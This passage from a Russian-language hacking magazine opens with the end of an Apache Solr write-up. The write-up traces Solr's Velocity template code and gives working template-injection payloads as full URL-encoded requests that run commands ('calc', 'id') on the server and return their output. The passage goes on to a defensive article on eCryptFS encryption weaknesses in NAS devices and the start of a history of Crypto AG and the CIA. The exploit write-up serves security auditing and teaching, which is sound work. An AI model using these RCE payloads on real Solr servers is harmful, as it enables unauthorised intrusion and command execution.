397:         Action result = call.call();

Здесь управление передается методу org.apache.solr.servlet.HttpSol‐
rCall#call.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java
175:   public HttpSolrCall(SolrDispatchFilter solrDispatchFilter,
CoreContainer cores,
176:                HttpServletRequest request, HttpServletResponse
response, boolean retry) {
...
468:   public Action call() throws IOException {

Немного дальше по коду происходит вызов org.apache.solr.servlet.
HttpSolrCall#writeResponse.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java
519:       HttpServletResponse resp = response;
...
535:             SolrQueryResponse solrRsp = new SolrQueryResponse();
...
556:             QueryResponseWriter responseWriter = getRes
ponseWriter();
...
558:             writeResponse(solrRsp, responseWriter, reqMethod);





              Отладка Apache Solr. Вызов writeResponse

Здесь responseWriter — это объект клас са VelocityResponseWriter. Он
парсит и рендерит шаблон. Сначала выполняется инициализация шаблониза‐
тора.


/solr-
8.1.1/solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java
827: private void writeResponse(SolrQueryResponse solrRsp, QueryR
esponseWriter responseWriter, Method reqMethod)
...
849:       QueryResponseWriterUtil.writeQueryResponse(out, respon
seWriter, solrReq, solrRsp, ct);


/solr-
8.1.1/solr/core/src/java/org/apache/solr/response/QueryRespon-
seWriterUtil.java
33: public final class QueryResponseWriterUtil {
34:   private QueryResponseWriterUtil() { /* static helpers only */ }
...
43:   public static void writeQueryResponse(OutputStream outputStream
,
44:       QueryResponseWriter responseWriter, SolrQueryRequest solrRe
quest,
45:       SolrQueryResponse solrResponse, String contentType) throws
IOException {
...
64:       Writer writer = buildWriter(out, ContentStreamBase.getCha
rsetFromContentType(contentType));
65:       responseWriter.write(writer, solrRequest, solrResponse);


/solr-
8.1.1/solr/contrib/velocity/src/java/org/apache/solr/response/Veloci-
tyResponseWriter.java
149: public void write(Writer writer, SolrQueryRequest request,
SolrQueryResponse response) throws IOException {
150:   VelocityEngine engine = createEngine(request);  // TODO: have
HTTP headers available for configuring engine

Посмотрим, откуда берется имя шаб лона.


/solr-
8.1.1/solr/contrib/velocity/src/java/org/apache/solr/response/Veloci-
tyResponseWriter.java
152: Template template = getTemplate(engine, request);

Для этого выполняется метод getTemplate. Заг лянем в его код.


/solr-
8.1.1/solr/contrib/velocity/src/java/org/apache/solr/response/Veloci-
tyResponseWriter.java
357: private Template getTemplate(VelocityEngine engine, SolrQu
eryRequest request) throws IOException {
358:   Template template;
359:
360:   String templateName = request.getParams().get(TEMPLATE);
...
363:   String path = (String) request.getContext().get("path");
364:   if (templateName == null && path != null) {
365:     templateName = path;
...
371:   try {
372:     template = engine.getTemplate(templateName + TEMPLATE_EXTENS
ION);

Это интересно. Сначала имя шаблона берется из запроса, параметр
v.template.


/solr-
8.1.1/solr/contrib/velocity/src/java/org/apache/solr/response/Veloci-
tyResponseWriter.java
61: public class VelocityResponseWriter implements QueryResponseWr
iter, SolrCoreAware {
...
70:   public static final String TEMPLATE = "v.template";

Если такой параметр не ука зан, в качестве имени шаблона используется
path. Поэтому в нашем случае сервер пробует загрузить /select.vm.





            Получение имени файла с шаб лоном в Velocity

Отлично, теперь можно ука зать любое имя файла для загрузки в качес тве
шаблона.


http://solr.vh:8983/solr/vel/select?q=any&wt=velocity&v.template=poc

Только вот это не особенно поможет в нашем слу чае, нам‐то нужно выпол‐
нить конкретный код. Чтобы обойти эту проблему, рассмотрим подробнее
инициализацию движка Velocity.


/solr-
8.1.1/solr/contrib/velocity/src/java/org/apache/solr/response/Veloci-
tyResponseWriter.java
149: public void write(Writer writer, SolrQueryRequest request,
SolrQueryResponse response) throws IOException {
150:   VelocityEngine engine = createEngine(request);  // TODO: have
HTTP headers available for configuring engine
...
280: private VelocityEngine createEngine(SolrQueryRequest request) {
281:   VelocityEngine engine = new VelocityEngine();
...
311:   if (paramsResourceLoaderEnabled) {
312:     loaders.add("params");
313:     engine.setProperty("params.resource.loader.instance", new
SolrParamResourceLoader(request));
314:   }

Узнаешь этот параметр? Да, это именно та настройка, что я перезаписы вал
в конфиге.





  Проверка настрой ки params.resource.loader.enabled при инициализации
   Velocity

А далее в дело вступает SolrParamResourceLoader.


/solr-
8.1.1/solr/contrib/velocity/src/java/org/apache/solr/response/Solr-
ParamResourceLoader.java
33: public static final String TEMPLATE_PARAM_PREFIX = Veloci
tyResponseWriter.TEMPLATE + ".";
...
35: private Map<String,String> templates = new HashMap<>();
36: public SolrParamResourceLoader(SolrQueryRequest request) {
...
43:   SolrParams params = request.getParams();
44:   Iterator<String> names = params.getParameterNamesIterator();
45:   while (names.hasNext()) {
46:     String name = names.next();
47:
48:     if (name.startsWith(TEMPLATE_PARAM_PREFIX)) {
49:       templates.put(name.substring(TEMPLATE_PARAM_PREFIX.length()
) + VelocityResponseWriter.TEMPLATE_EXTENSION,params.get(name));
50:     }
51:   }
52: }

Этот код берет все параметры из запроса, и если они начинаются на
v.template., то они записываются в спи сок шаблонов. Рас смотрим на при‐
мере. Допустим, я отправляю следующий запрос.


http://solr.vh:8983/solr/vel/select?q=any&wt=velocity&v.template=poc&
v.template.poc=HELLO!

После того как отработает код выше, в переменной templates будет
находиться шаблон с именем poc.vm и содержимым HELLO!.





          Создание Velocity‐шаб лона из запроса в Apache Solr

Теперь все возможности для удачной экс плуатации у нас в руках. Формируем
запрос. Полезную нагрузку нужно преобразовать в кодировку, безопасную
для URL. Переносы строк можно спокойно заменять на пробелы. В резуль‐
тате


#set($t="any")
#set($rnt=$t.class.forName("java.lang.Runtime"))
#set($ex=$rnt.getRuntime().exec('calc'))
$ex.waitFor()

преобразуется в


%23set%28%24t%3D%22any%22%29+%23set%28%24rnt%3D%24t.class.
forName%28%22java.lang.Runtime%22%29%29+%23set%28%24ex%3D%24rnt.
getRuntime%28%29.exec%28%27calc%27%29%29+%24ex.waitFor%28%29

Собираем все в одном запросе, отправляем на сервер и наблюдаем завет‐
ный калькулятор.


http://solr.vh:8983/solr/vel/select?q=any&wt=velocity&v.template.
%2fselect=%23set%28%24t%3D%22any%22%29+%23set%28%24rnt%3D%24t.class.
forName%28%22java.lang.Runtime%22%29%29+%23set%28%24ex%3D%24rnt.
getRuntime%28%29.exec%28%27calc%27%29%29+%24ex.waitFor%28%29





     Выполнение произволь ного кода в Apache Solr через шаблоны

Здесь в качестве шаблона я использовал несущес твующий /select.vm. Тот
же самый результат будет, если указать имя шаблона прямо в запросе. Вот
пример с более продвинутым экспло итом, который выводит результат работы
выпол ненной команды.


#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.
read()))
#end


http://solr.vh:8983/solr/vel/select?q=any&wt=velocity&v.template=poc&
v.template.poc=%23set%28%24x%3D%27%27%29%20%23set%28%24rt%3D%24x.
class.forName%28%27java.lang.
Runtime%27%29%29%20%23set%28%24chr%3D%24x.class.forName%28%27java.
lang.Character%27%29%29%20%23set%28%24str%3D%24x.class.
forName%28%27java.lang.String%27%29%29%20%23set%28%24ex%3D%24rt.
getRuntime%28%29.exec%28%27id%27%29%29%20%24ex.
waitFor%28%29%20%23set%28%24out%3D%24ex.getInp
utStream%28%29%29%20%23foreach%28%24i%20in%20%5B1..%24out.availa
ble%28%29%5D%29%20%24str.valueOf%28%24chr.toChars%28%24out.
read%28%29%29%29%20%23end





     RCE в Apache Solr через шаблоны с выводом результата работы

На просторах гитхаба ты можешь найти еще массу подобных и более прод‐
винутых пейлоадов.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Сегодня мы рассмотрели две уязвимости, которые час тенько встречаются
при аудитах корпоративных окру жений. Они помогают получить доступ к сер‐
веру для закрепления в сети, раз ведки и ата ки на внутренние ресурсы.
   Разработчики выпустили обновленные версии Solr и патчи к старым. Так
что, если администрируешь такой сервер, спеши обновляться!
ПРИВАТНОСТЬ
 ДЫРЯВЫЕ
  ДИСКИ





    ПОЧЕМУ НЕ СТОИТ ПОЛАГАТЬСЯ
     НА ШИФРОВАНИЕ СРЕДСТВАМИ
               NAS




Шифрованием пользуются все. Будь то Bit‐
Locker в Windows, LUKS в Linux, кросс‐плат‐
форменный  VeraCrypt  или  встро енная
в смартфоны Android и Apple система шиф‐
рования, мы привыкли  к определен ному           Олег Афонин                                                                                      Эксперт по мобильной
набору функций. Привыкли к мгно вен ной       криминалистике«Элкомсофт»компании
смене пароля, уничтожению данных через        aoleg@voicecallcentral.com
удаление ключа шифрования,  к высокой
стойкости шифрования. Казалось бы, спе‐
циализированные NAS тем более должны
оправдывать все эти ожидания. Но на деле
во многих NAS ситуация с шифрованием
весьма печальна, и виной тому — файловая
система eCryptFS.


ШИФРОВАНИЕ В СЕТЕВЫХ НАКОПИТЕЛЯХ (NAS)
Рынок сетевых хранилищ для домашних и офисных пользователей выглядит
достаточно инте ресно. Самые массовые модели — Western Digital, произво‐
дителя жестких дисков. NAS от WD привлекают низ кой ценой, иногда даже
отрицательной: диск в накопителе обходится дешевле такого же диска
отдельно. При этом шифрования данных в тех самых массовых моделях WD
просто нет. Нет совсем, как класса.
  Особое место занимает компания Synology, домашние сетевые накопи‐
тели которой отличаются красивым, хорошо оптимизированным софтом,
качественным железом и длительным периодом поддержки — за соответс‐
твующие деньги. Популярностью пользует ся и ближайший конкурент — ком‐
пания QNAP, устрой ства начального уровня которой име ли статистически
значимые проблемы с качес твом, а остальные исполь зуют не самый быс трый,
перегруженный функциями и время от времени пробивающейся рекламой
софт.
  В роли догоняющих выступа ют такие про изво дители, как ASUS (Asustor)
и TerraMaster. Не выдержав конкуренции, сошли с дистанции Thecus и мало‐
известные у нас Drobo и Buﬀalo. В отличие от Western Digital, большинство
моделей этих производителей поддерживает шифрование, позволя ющее
защитить пользовательские данные. Про изво дители поделились на два
лагеря: представители одно го из них (QNAP, Thecus) используют шифрование
на уровне тома (volume‐based encryption), в то время как второй лагерь (Syn‐
ology, Asustor, TerraMaster) предпочитает шифрование отдельных сетевых
папок на уровне файловой системы. У каж дого способа есть свои преиму‐
щества и недостатки. Нас интересуют предста вители второго лагеря, исполь‐
зующие для шифрования криптографичес кую фай ловую систему eCryptFS.


ECRYPTFS В NAS: ДОСТОИНСТВА И НЕДОСТАТКИ
Во всех исследованных NAS, использующих шифрование сетевых папок,
защита реализована средс тва ми стандартной для Linux файловой системы
eCryptFS, о которой можно почитать здесь или здесь. С точки зрения про‐
изводителей NAS, eCryptFS обладает рядом достоинств:
 1. Уже готовое, проверенное решение: не нужно разрабаты вать самос‐
   тоятельно (обыч но качественно реализовать вещи, которые относятся
   к безопасности, у производителей NAS не получается, поэтому исполь‐
   зование готовых компонентов — меньшее зло).
 2. Стандартная реализация шифрования поз воляет просто скопировать
  зашифрованную папку, к примеру, на дру гой накопитель — и данные оста‐
   нутся зашифрованными. При этом смонтировать и расшифровать такую
   папку получится стандартными средс тва ми на любом компьютере с Linux.
  Приятный бонус: зашифрованные файлы можно скопировать и на диск,
  отформатированный в NTFS или FAT32/exFAT.
 3. Бесплатно: не нужно платить за лицензии, снижается себестоимость
   устройства.
 4. Безопасное резервное копиро вание: для соз дания и поддержания резер‐
   вных копий (в том числе инкрементных) нет необходимости рас шифро‐
   вывать данные и монтировать зашифрованные сетевые папки. На самом
   деле администратор может даже не знать пароли от каждой из зашиф‐
   рованных папок — данные все равно будут корректно скопированы
   или восстановлены. Изменения в незашифрованных фай лах отражаются
   и в зашифрованных. Важный с точки зрения безопасности момент: нет
   необходимости хранить клю чи шифрования в самом NAS, что делает
   резервное копирование не только удобным, но и безопасным. Впрочем,
   не буду незаслуженно хвалить производителей NAS: об этой возможности
   eCryptFS знают далеко не все, а вос пользовать ся ей дос таточно сложно.
  Например, в Synology тебе придется установить приложение Hyper Backup
   и разобраться с принципом его работы — или пользоваться  rsync
   из командной строки.
 5. Поскольку шифруются отдельные сетевые папки, не имеет значения,
   на каком из физичес ких или логических накопителей они расположены.
   Главное, чтобы была поддержка на уровне файловой сис темы. Впрочем,
  шифрование сетевых папок на внеш них накопи телях, которые можно под‐
   клю чить к NAS через USB, не поддерживает ни один известный мне про‐
   изводитель NAS незави симо от того, какая на внешнем устройстве фай‐
   ловая система. (В накопителях Asustor можно назначить один или несколь‐
   ко встроенных дисков в качес тве архивных; для таких дис ков шифрование
   доступно.)
 6. Каждый пользователь может зашифровать свою папку своим собс твенным
   паролем. Таким обра зом обеспечива ется защита данных каждого авто‐
   ризованного пользователя NAS от других авторизо ванных пользователей.
 7. Шифруются как сами данные, так и имена папок и файлов. Но не структура
   каталогов, количество и размер файлов.

Есть у eCryptFS и целый ряд недос татков, способных серьезно повлиять
на опыт использования NAS или даже сделать шифрование невозможным.
 1. Шифрование папок — это не «сквозное шифрование». Анализ зашиф‐
   рованной папки позволит узнать структуру папок, количество и размер
  зашифрованных файлов, объем зашифрованных данных.
 2. Ограничения на длину имени файла. В зашифрованной eCryptFS папке
   длина имени файла (или папки) не может превышать 143 символа ANSI
   или 47 символов иероглифической записи (почему так). Это ограничение
   идет с давних времен, и связано оно в первую оче редь с тем, что крип‐
   тографические файловые системы — сво еобразные «костыли», работа‐
  ющие поверх обычных файловых систем. К при меру, вот так может выг‐
   лядеть зашифрованное имя файла ~/.bashrc:


   ECRYPTFS_FNEK_ENCRYPTED.dWek2i3.WxXtwxzQdkM23hiYK757lNI7Ydf0xqZ1L
   pDovrdnruDb1‐5l67.EU‐‐





    NAS производства ASUS чес тно сообщает об ограниче ниях на длину
    имени
 3. Для зашифрованных папок не поддерживается NFS (в продуктах Synology).
 4. Ключ шифрования — хеш от пароля. Почему это плохо? Если данные
  зашифрованы паролем или его хешем, смена пароля приводит к необ‐
   ходимости перешифровать файлы (в большинстве NAS сменить пароль
   нельзя; можно лишь рас шифро вать и заново зашифровать папку — раз‐
   влечение на несколь ко дней, если речь идет о большом объ еме данных).
   Как делать правильно? Разделять ключи шифрования данных (Data Encryp‐
    tion Key, DEK или Media Encryption Key, MEK) и клю чи шифрования ключей
  шифрования (Key Encryption Key, KEK). Собственно пароль в правильной
   схеме шифрования должен использовать ся исключительно для шиф‐
   рования KEK (так, к при меру, сделано в реализации EFS в Windows).
 5. Потенциально низкая энтро пия пароля. Прос тая логика: если ключ шиф‐
   рования не сохранять на устройстве (что эквивалентно отсутствию шиф‐
   рования), то пароль придется вводить каждый раз для доступа к зашиф‐
   рованным данным. В таких условиях большинс тво использует пароль
   с чрезвычайно низкой энтропией, восстановить который в слу чае атаки
   будет довольно прос то. Обрати внимание: мало того что пароль может
   быть с невысокой энтропией, так его еще и сменить не получится.
 6. Метаданные шифрования хра нятся в каждом файле. Это приводит к тому,
   что быстро и надежно уда лить зашифрованную информацию невозможно.
   Удаление зашифрованной папки не приводит к без возвратному унич‐
  тожению зашифрованных данных (а вот быс трое форматирование тома
   BitLocker или FileVault 2 — приводит).





    В окне редактирования зашифрованного тома просто нет поля
     для смены пароля

Чем может грозить утечка таких данных, как объем зашифрованной информа‐
ции, количество файлов и размер каж дого файла? Как минимум — отказом
правдоподобного отрицания. Соответс твенно, к зашифрованным папкам
применимы такие атаки, как профилирование по размеру файлов, что поз‐
воляет узнать содер жимое зашифрованной папки, если размер заданного
количества файлов совпадает с размером извес тных атакующему файлов.


РЕКОМЕНДАЦИИ: КАК ОБЕЗОПАСИТЬ ЗАШИФРОВАННЫЕ ДАННЫЕ
Как мы выяснили, использование зашифрованных папок в качестве единс‐
твенного уров ня защиты обладает рядом недос татков, которые могут быть
критическими для многих пользователей. Если ты все же решишь исполь‐
зовать шифрование средс тва ми NAS, а фактичес кая безопасность кон‐
фиденциальных данных для тебя важнее удобства, вос пользуйся следующими
рекомендациями.
 1. Помни: единожды уста новленный пароль шифрования ты сме нить не смо‐
  жешь без полной расшифровки папки с последующим шифрованием фай‐
   лов новым паролем. Соответственно, имеет смысл установить длинный
   пароль с высокой энтро пией, желательно — набор случайных символов.
  Помни, что скорость атаки на eCryptFS высокая и пароль с низкой энтро‐
   пией может быть восстановлен очень быстро.
 2. Ни в коем случае не сох раняй ключ шифрования в самом устройстве. Если
   ты сохранишь ключ на устройстве, то злоумышленник сможет смон‐
   тировать зашифрованные папки без особого тру да.
 3. Проконтролируй создание и сохранение резервного ключа (в Synology
   это файл с расширением .key, который будет сохранен на твоем компь‐
   ютере автоматически после создания зашифрованной папки). Если ты
  решишь сохранить этот ключ, держи его в зашифрованном виде (в архиве
   с паролем или на зашифрованном диске).
 4. Если ты решишь сохранить ключ шифрования на USB‐накопителе (нап‐
   ример, в случае офисного NAS), обес печь физическую безопасность это‐
   го накопителя.
 5. Откажись от автоматического монтирова ния зашифрованных папок. Авто‐
   матическое монтирование зашифрованных  данных  при  загрузке —
   это полное отсутствие безопас ности.


Уда лен ные ата ки
Обрати внимание: шифрование любым способом не защитит твои данные
от удаленных атак. В сетевых хранилищах большинства производителей вре‐
мя от времени об наруживают уязвимости, позволя ющие проникнуть на них
как хакерам, так и вирусам‐шифровальщикам. Если в момент взлома (или
после него, если на взло манном устройстве оста нется резидентный процесс)
будут смонтированы зашифрованные  тома  или  папки,  злоумышленник
получит доступ ко всей (более не защищенной) информации.
  Например, в популярной модели Asustor AS‐602T исследователи нас‐
читали пятнадцать уязвимостей, включая CVE‐2018‐12308 — «Ключ шиф‐
рования к зашифрованным папкам передается в виде параметра URL».



КАК ДЕЛАТЬ ПРАВИЛЬНО
Шифрование на уровне сетевых папок способно защитить данные от чрез‐
вычайно узкого спектра угроз (а в реализаци ях некоторых производителей —
только от очень нелюбо пытного «чайника»). А как сделать правильно?
  Правильный с точки зрения безопасности подход — многослойное шиф‐
рование наподобие того, что реализова но в современных моделях MacBook,
оборудованных чипом T2. В этих моделях первым (точнее, нулевым) уровнем
защиты идет SED, аппаратное шифрование на уровне контрол лера дис ка,
и только вторым — хорошо изученный FileVault 2. В результате извле чение
диска из ноутбука не дает воз можнос ти даже снять образ диска, чтобы поп‐
робовать подобрать пароль к зашифрованному FileVault 2 тому: ключ шиф‐
рования к SED хранится в соп роцес соре Secure Enclave и выдается диску
в процессе загрузки при усло вии, что диск установлен именно в тот MacBook,
на котором было активировано шифрование. В результате без конкретного
экземпляра Secure Enclave невоз можно расшифровать ни диск отдельно,
ни тот же диск, вставленный в дру гой MacBook.
   Аналогом такого нулево го уровня шифрования в сетевых хранилищах
будет использование все того же механизма SED — шиф рования средствами
контроллера жесткого дис ка. При том что далеко не все диски поддерживают
SED — выбор в любом случае оста вался бы за пользовате лем. Ключ же впол‐
не способны защитить механизмы TrustZone (для NAS на архитектуре ARMv8)
или TPM 2.0 / Intel PTT (для устройств, основанных на процессорах Intel),
которые уже встроены в большинство современных сетевых накопителей,
но никак при этом не используются производителями. Использование SED (и
только оно!) позволит защитить NAS от очевидной атаки: извлечения диска
с целью редактирования файла с паролями и получения административного
доступа к накопителю. (В скобках: SED в «домаш них» моделях NAS поддержи‐
вается такими производителями, как QNAP и Thecus.)
  Независимо от того, поддерживают или не поддерживают шиф рование
на уровне контрол лера уста новленные в устройство диски, нужно исполь‐
зовать первый уровень защиты — шиф рование на уровне тома. Здесь про‐
изводителям не придется придумывать что‐то новое: LUKS — вполне раз‐
витая система шифрования, обла дающая рядом дос тоинств:
 • совместимость и стандартизация: воз можность вос становления данных;
 • высокий уровень устойчивос ти к атакам;
 • поддержка разных ключей и паролей, причем нес кольких одновременно;
 • мгновенная смена и отзыв скомпромети рованных паролей.

Наконец, второй уровень шифрования — на уровне сетевых папок — нужно
реализовать средствами файловой системы. Вот только eCryptFS для этого
не подходит: слишком серьезные функциональные ограничения, слишком
низкий уровень безопасности и конфиденциаль нос ти и все та же невоз‐
можность быстро сменить или отозвать скомпро метированный пароль дела‐
ют ее малопригодной для сколько‐нибудь серь езного использования в рам‐
ках сетевых хранилищ.
  Для чего нужны и от чего защитят эти уровни? Каждый из них необходим
на своем месте, и каждый способен защитить от вполне конкретных угроз,
против которых бесполезны или малоэффективны дру гие уровни защиты.
 1. Шифрование SED защитит в первую очередь от атаки, в которой извле‐
   кается диск и редактируется файл с паролями. Никакие другие уровни
  шифрования от этого не защитят. Кроме того, SED позволяет практичес ки
   мгновенно и безвозвратно уничтожить все данные на диске, включая сис‐
   темные. Наконец, SED делает невоз можным доступ к любой информации,
   если диск извлечь из NAS: не получится даже снять образ дис ка, чтобы
   начать перебор паролей к зашифрованным томам или папкам.
 2. Шифрование тома. Если SED охра няет данные на этапе «до загрузки», то
  шифрование тома эффективно защитит твои данные уже после загрузки
   NAS. Если ты не сохранял пароль от зашифрованного тома в самом
   устройстве (как это сделано в QNAP) или на легко доступном внешнем
   носителе (как это сделано в Thecus), то к твоим файлам взломщик не под‐
   берется. Впрочем, стоит любому пользователю смонтировать зашиф‐
   рованный том, как расшифрованы будут все фай лы всех пользователей
   устройства.
 3. Шифрование сетевых папок. Сам по себе этот слой обес печивает самую
   слабую, медленную и наименее эффектив ную  защиту данных. Тем
   не менее его вклю чение поможет защитить важнейшие данные в отдель‐
   ных папках: ты можешь наз начить (и не сохранять нигде в NAS) уникальные
   пароли для разных папок и разных пользователей. Защищенные таким
   образом данные можно сохранять в виде резервных копий, даже не мон‐
   тируя зашифрованные папки. Такая воз можность присутствует в проп‐
   риетарных продуктах (например, Synology Hyper Backup). Впрочем, никто
   не мешает тебе воспользоваться и командой rsync, включив ее в рас‐
   писание.

Логичный вопрос: как шифрование сначала одним, потом другим и, наконец,
третьим слоем повлияет на произво дительность и конечную стоимость
устройств? При грамотной реализации — практически не повлияет. Почему?
Рассмотрим затраты на шифрование.
  Первый уро вень: SED. Само название Self‐Encrypting Drive подразуме‐
вает, что шифрование будет производиться средствами самого жес ткого
диска,  на  уров не  его  SATA‐контроллера. Падение производительности
нулевое, затраты на реализацию в аппа ратной части у производителя NAS
тоже нулевые. Все, что нужно, — поддержка нескольких команд в софте
и соответствующие окошки в GUI. Что интересно, некоторые производители
поддерживают SED, а некоторые (камень в огород потребительских моделей
Synology) не поддерживают. При этом решение о покупке диска с SED
или без него принимает или сам пользователь, или системный интегратор,
если речь идет об офис ном применении. Производители, которые действи‐
тельно заинтересованы в обеспечении безопасности данных, могут исполь‐
зовать аппаратный контроллер с поддержкой AES — подобно тому, как пос‐
тупает компания Western Digital с устройства ми WD My Book DUO.
  Вто рой  уро вень: шифрование  на  уровне  тома.  Здесь  уже
желательно (но не обязательно) использовать выделенный контрол лер,
который бы шифровал блоки данных, записываемых на один или нес колько
дисков одновременно (здесь важна высокая скорость потокового шиф‐
рования). Такие контроллеры дорогие? Нет: абсо лютно все внешние диски
WD линеек My Passport и My Book используют встро енные в корпуса (а точ‐
нее — в переходники SATA‐USB) контрол леры с поддержкой шифрования.
Стоимость такого кон троллера — десят ки центов, а скорость работы…
в модели WD My Book DUO мне удалось добить ся скорости записи с шиф‐
рованием порядка 300 Мбайт/с, причем скорость записи без шиф рования
была ровно такой же. Для NAS — хва тит с избытком.
  Тре тий  уро вень: шифрование  сетевых  папок.  Здесь  ничего
не меняется: шифрование средства ми файловой сис темы. Только, пожалуй‐
ста, не используй eCryptFS! Эта файловая система с ее ограничениями
на длину имен файлов никогда не предназна чалась для работы в сетевых хра‐
нилищах! Даже afs и то лучше подходит для защиты сетевых ресурсов; на рын‐
ке хватает и других решений, часть из которых небес платны. А вот советовать
производителям NAS сделать что‐то свое я не решусь: программисты ASUS
уже пробовали, и их реализация шифрования ока залась… не совсем шиф‐
рованием. Переход на eCryptFS, какой бы неподходящей она ни была, стал
положительно прорывом.


ЗАКЛЮЧЕНИЕ
Выбор средств защиты всегда компромисс между удобством и безопас‐
ностью. И если Microsoft и Apple уда лось разработать безопас ные и удобные
решения, то у производителей NAS получился выбор между неудобной
защитой с неров ным уровнем безопасности и удобной — с нулевым уровнем
защиты. В то же время даже такое шифрование поз волит защитить данные
от некоторых видов угроз. Главное — правильно настроить шифрование
и четко понимать, против каких угроз такая защита эффективна, а против
каких бесполезна.
ПРИВАТНОСТЬ
 ШВЕЙЦАРСКАЯ
НЕ НАДЕЖНОСТЬ
           КАК АМЕРИКАНСКАЯ РАЗВЕДКА
      ВНЕДРИЛА УЯЗВИМОСТИ В ШИФРЫ
               КОМПАНИИ CRYPTO AG





                                                                                            atreau
                                                                                             zinik.alexander@gmail.com





Американская разведка могла  читать шифры, которыми
десятилетиями пользовалась чуть ли не половина мировых
правительств, — благода ря тайному сотрудничеству с фир‐
мой‐производителем. Журналисты  получи ли  неопровер‐
жимые доказательства того, что компания Crypto AG сот‐
рудничала с ЦРУ. В этом материале мы разберем историю
компании и посмотрим, какими же фактами удалось зав‐
ладеть сотрудникам Washington Post.


ОЧЕВИДНОЕ — НЕВЕРОЯТНОЕ
Если попытаться пересказать историю максимально кратко, то получится вот
что. Во второй половине ХХ века большинс тво мировых стран приобре тало
шифровальные машины в одной швейцарской компании. Эта компания была
втайне куплена американской и немецкой раз ведкой — ради доступа к шиф‐
рам ее клиентов. Имея доступ к шифрам, можно было расшифровывать сек‐
ретную переписку, что и делалось.





                  Логотип компании Crypto AG

Но чем больше внимания уделяешь подробнос тям операции, тем более
невероятной она оказыва ется. В ней есть мес то мно гому: знаменитым людям
из засекреченных служб, долгой и верной дружбе, коррупции и идеализму,
талантливым женщинам и болтливым президентам.
  И если бы не тесная профес сиональная дружба двух эмигрантов из Рос‐
сийской империи, всей этой истории могло бы и не быть или бы она могла
развернуться каким‐то совсем другим образом.
  Но произошло то, что произошло, — и одной стране достались плоды
(говоря современным языком) хедхантин га, нетворкинга, синергии, инвести‐
ций в перспективные технологии — а другой пришлось иметь дело с утечкой
мозгов, кадровым голодом и догоняющим развитием. Впрочем, третьим
странам и вовсе достаются готовые про дукты чужой высокотехнологичной
промышленности, да еще и с подвохом. И если тебе кажется, что эта исто‐
рическая параллель притяну та за уши, то прочитай статью до конца — может
быть, подробности истории смогут тебя убедить.


СГОВОР СТОЛЕТИЯ
Итак, что же это за «сговор столетия»? Пос леднее, кстати, не просто жур‐
налистское клише — такое сло восочетание упот ребляют сами сотрудни ки
ЦРУ в подробном документе об успехах прошлого, составленном для Отдела
изучения истории разведки.


             INFO

                     Отдел изучения истории разведки — подразде‐
                       ление разведки, которое занимается сох ранени‐
                    ем истории разведывательной деятельности (в
                      том числе — в ведомственном музее ЦРУ) и изда‐
                         ет специализирован ный журнал для внутреннего
                       пользования.


Работая на внутреннюю аудиторию, состоящую из своих коллег, раз ведчики
наконец‐то могут пооткровенничать — и в подробнос тях рассказать о тер‐
нистом пути, ведущем к невероятному успеху. И им есть чем похвастаться.
Описанная в 96‐страничном документе операция (носившая сначала наз‐
вание «Тезаурус», а потом «Рубикон», также американцы использовали
кодовое имя «Минерва») стала одним из самых дерзких планов разведчи‐
ков — и этот план удался.
   «Иностранные правительства платили хорошие деньги США и Западной
Германии за  то, чтобы те читали их самую засекреченную корреспон‐
денцию», — говорится в заключении это го документа.
  Однако теперь поводы гордиться своими достижениями есть не только
у них. Каким‐то образом сотрудники Washington Post смогли заполу чить этот
самый подробный документ, а их немецкие коллеги — под твердить и допол‐
нить его содержание в беседах с бывшими сотрудниками немецкой спец‐
службы BND.
  Журналистам пришлось пойти на некоторые уступки своим информантам
(соблюдение анонимности источников впол не понятно) — пообещать не пуб‐
ликовать отчет об операции «Рубикон» целиком, ограничиваясь короткими
цитатами.


ЕГО ЗВАЛИ БОРИС
Вся сложная и длинная операция спецслужб ухо дит корнями еще во времена
до Второй мировой вой ны. А если взять за начало истории рождение ее клю‐
чевого фигуранта — то и в XIX век.
  В 1892 году у технического директора (впос ледс твии — управляющего)
«Товарищества братьев Нобель» в Баку родился сын. Отца звали Карл
Хагелин, а сына — Борис Цезарь Вильгельм Хагелин. Фирма братьев Нобель
была крупной и технологически продвинутой компанией, так что карьера
Хагелина‐отца, талантливого инженера, скла дывалась весьма удачно —
к 1899 году он вошел в высшее руководс тво компании. Нас тавничество
и деньги отца позволили Борису Хагелину получить отличное инженерное
образование в Шве ции.
  Но в 1917 году грянула революция. Нефтяной бизнес был национализи‐
рован. Семьи Нобель и Хагелин были вынуж дены переехать в Шве цию
и думать, как жить дальше. Имеющиеся капиталы нужно было во что‐то
инвестировать...
  Тем временем братья Дамм, инженер ткацких станков и учи тель матема‐
тики, как раз отчаянно нуждались в инвестициях. Они страстно горели идеей
механического ротор ного шифровального устрой ства, но никак не могли
довести до ума прототип и найти заказ чиков.
  Эммануилу Нобелю и Карлу Хагелину показа лось, что удобное шиф‐
рование сообщений может быть востребовано в бизнес‐кругах. Представ‐
лять интересы инвесторов и контролировать процесс в компанию AB Crypto‐
graph назначили Хагелина‐младшего. Назначение оправдало себя: счи тает‐
ся, что именно Борис Хагелин дорабо тал машину Арвида Дамма и превратил
ее в первый коммерчески успешный продукт фирмы — переносную роторную
шифровальную машину B‐21. Вооруженные силы Швеции закупили партию
таких машин вместо легендарной немецкой «Эниг мы».





    B‐21 — пер вая серийная шифровальная машина компании Хагелина

В тридцатые годы Хагелину уда лось получить контракт на раз работку компак‐
тной шифровальной машины для французской армии. Модель оказалась
крайне успешной — весила около четырех килограммов, была размером
с толстую книгу, работала от вра щения рукоятки и выдавала скорость шиф‐
рования до 30 символов в минуту. Так что в 1937 году Борис Хагелин отпра‐
вился в деловую поездку в США — демонстри ровать свое детище.


БОЛЬШАЯ ВОЙНА, БОЛЬШИЕ ДЕНЬГИ
Поездка Хагелина увенчалась успехом. Его машина произвела впе чат‐
ление — Хагелин получил контракт, который с началом Второй мировой вой‐
ны значительно расширят. Новая версия машины Хагелина будет выпускаться
